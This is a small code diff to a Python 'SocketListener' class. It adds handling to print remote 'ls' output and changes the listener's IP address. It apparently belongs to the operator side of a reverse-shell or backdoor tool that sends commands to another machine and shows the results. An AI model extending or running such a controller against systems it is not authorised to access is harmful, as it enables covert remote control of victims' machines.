@@ -61,9 +61,12 @@ class SocketListener:
                 if command_input[0] == "pwd" and "Error!" not in command_output:
                     print(command_output)
                     
+                if command_input[0] == "ls" and "Error!" not in command_output:
+                    print(command_output)
+                    
             except Exception:
                 command_output = "Error!"
                 print(command_output)
                 
-my_socket_listener = SocketListener("192.168.212.80", 8080)
+my_socket_listener = SocketListener("192.168.127.132", 8080)
 my_socket_listener.start_listener()
